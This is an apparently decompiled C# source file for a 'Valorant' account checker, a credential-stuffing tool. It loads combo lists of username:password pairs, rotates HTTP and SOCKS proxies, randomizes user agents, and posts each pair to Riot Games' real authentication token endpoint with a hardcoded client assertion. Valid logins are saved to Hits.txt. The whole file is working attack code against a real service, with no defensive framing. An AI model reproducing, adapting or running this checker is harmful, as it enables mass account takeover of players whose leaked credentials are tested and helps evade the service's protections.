using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using Colorful;
using Leaf.xNet;

namespace Valorant
{
	// Token: 0x02000004 RID: 4
	internal class CheckerHelper
	{
		// Token: 0x06000006 RID: 6 RVA: 0x000023A0 File Offset: 0x000005A0
		public static void LoadCombos(string fileName)
		{
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							CheckerHelper.total++;
						}
					}
				}
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002438 File Offset: 0x00000638
		public static void LoadProxies(string fileName)
		{
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							CheckerHelper.proxytotal++;
						}
					}
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000024D0 File Offset: 0x000006D0
		public static void UpdateTitle()
		{
			for (;;)
			{
				CheckerHelper.CPM = CheckerHelper.CPM_aux;
				CheckerHelper.CPM_aux = 0;
				Colorful.Console.Title = string.Format("Valorant // Progress = {0}/{1} // Valid = {2} // Invalid = {3} // 404 = {4} // CPM: ", new object[]
				{
					CheckerHelper.check,
					CheckerHelper.total,
					CheckerHelper.hits,
					CheckerHelper.bad,
					CheckerHelper.err
				}) + (CheckerHelper.CPM * 60).ToString();
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002574 File Offset: 0x00000774
		public static void Check()
		{
			for (;;)
			{
				if (CheckerHelper.proxyindex > CheckerHelper.proxies.Count<string>() - 2)
				{
					CheckerHelper.proxyindex = 0;
				}
				try
				{
					Interlocked.Increment(ref CheckerHelper.proxyindex);
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>())
						{
							CheckerHelper.stop++;
							break;
						}
						Interlocked.Increment(ref CheckerHelper.accindex);
						string[] array = CheckerHelper.accounts[CheckerHelper.accindex].Split(new char[]
						{
							':',
							';',
							'|'
						});
						string text = array[0] + ":" + array[1];
						try
						{
							if (CheckerHelper.proxytype == "HTTP")
							{
								httpRequest.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
								httpRequest.Proxy.ConnectTimeout = 5000;
							}
							if (CheckerHelper.proxytype == "SOCKS4")
							{
								httpRequest.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
								httpRequest.Proxy.ConnectTimeout = 5000;
							}
							if (CheckerHelper.proxytype == "SOCKS5")
							{
								httpRequest.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
								httpRequest.Proxy.ConnectTimeout = 5000;
							}
							if (CheckerHelper.proxytype == "NO")
							{
								httpRequest.Proxy = null;
							}
							httpRequest.KeepAlive = true;
							httpRequest.IgnoreProtocolErrors = true;
							httpRequest.ConnectTimeout = 5000;
							httpRequest.Cookies = null;
							httpRequest.UseCookies = true;
							httpRequest.UserAgentRandomize();
							string str = string.Concat(new string[]
							{
								"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|",
								array[0],
								"&password=",
								array[1],
								"&scope=openid offline_access lol ban profile email phone"
							});
							string text2 = httpRequest.Post("https://auth.riotgames.com/token", str, "application/x-www-form-urlencoded").ToString();
							if (text2.Contains("invalid_credentials"))
							{
								CheckerHelper.bad++;
								CheckerHelper.check++;
								CheckerHelper.CPM_aux++;
							}
							else if (text2.Contains("access_token"))
							{
								Colorful.Console.Write(" [ + ] " + text + "\n", Color.MediumVioletRed);
								CheckerHelper.hits++;
								CheckerHelper.check++;
								CheckerHelper.CPM_aux++;
								CheckerHelper.SaveHITS(text);
							}
							else
							{
								CheckerHelper.accounts.Add(text);
							}
							CheckerHelper.err++;
						}
						catch (Exception)
						{
							CheckerHelper.accounts.Add(text);
						}
					}
					continue;
				}
				catch
				{
					Interlocked.Increment(ref CheckerHelper.err);
					continue;
				}
				break;
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002874 File Offset: 0x00000A74
		public static void SaveHITS(string account)
		{
			try
			{
				using (StreamWriter streamWriter = File.AppendText("Hits.txt"))
				{
					streamWriter.WriteLine(account);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000028C8 File Offset: 0x00000AC8
		private static string Parse(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}

		// Token: 0x04000003 RID: 3
		public static int check = 0;

		// Token: 0x04000004 RID: 4
		public static int hits = 0;

		// Token: 0x04000005 RID: 5
		public static int err = 0;

		// Token: 0x04000006 RID: 6
		public static int bad = 0;

		// Token: 0x04000007 RID: 7
		public static int accindex = 0;

		// Token: 0x04000008 RID: 8
		public static List<string> proxies = new List<string>();

		// Token: 0x04000009 RID: 9
		public static string proxytype = "";

		// Token: 0x0400000A RID: 10
		public static int proxyindex = 0;

		// Token: 0x0400000B RID: 11
		public static int proxytotal = 0;

		// Token: 0x0400000C RID: 12
		public static int stop = 0;

		// Token: 0x0400000D RID: 13
		public static List<string> accounts = new List<string>();

		// Token: 0x0400000E RID: 14
		public static int CPM = 0;

		// Token: 0x0400000F RID: 15
		public static int CPM_aux = 0;

		// Token: 0x04000010 RID: 16
		public static int total;

		// Token: 0x04000011 RID: 17
		public static int threads;
	}
}
